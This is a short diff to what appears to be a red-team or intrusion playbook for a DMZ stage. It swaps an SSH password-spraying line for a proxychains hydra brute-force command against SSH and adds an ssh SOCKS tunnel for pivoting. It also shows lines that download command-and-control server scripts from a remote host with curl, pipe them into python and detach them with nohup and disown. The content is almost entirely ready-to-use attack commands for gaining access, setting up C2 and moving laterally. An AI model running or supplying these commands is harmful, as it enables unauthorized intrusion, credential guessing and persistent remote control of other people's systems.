@@ -11,11 +11,12 @@
 ###### DMZ
 ```txt
 # initial access
-spraySSH <TARGET> <USERDICTIONARY> <PASSWORDDICTIONARY>
+proxychains hydra -L <USERDICTIONARY> -P <PASSWORDDICTIONARY> <IP> ssh -u -V;
 
 # on penetration, backup C2 and proxy
 nohup curl --insecure -sv https://<IP>/c2_http_basic_server.py|python - & disown
 nohup curl --insecure -sv https://<IP>/c2_python_proxy_server.py|python - & disown
+ssh -f -N -D <IP>:65535 root@localhost
 
 # edit proxychains.conf
 localnet 127.0.0.0/255.0.0.0
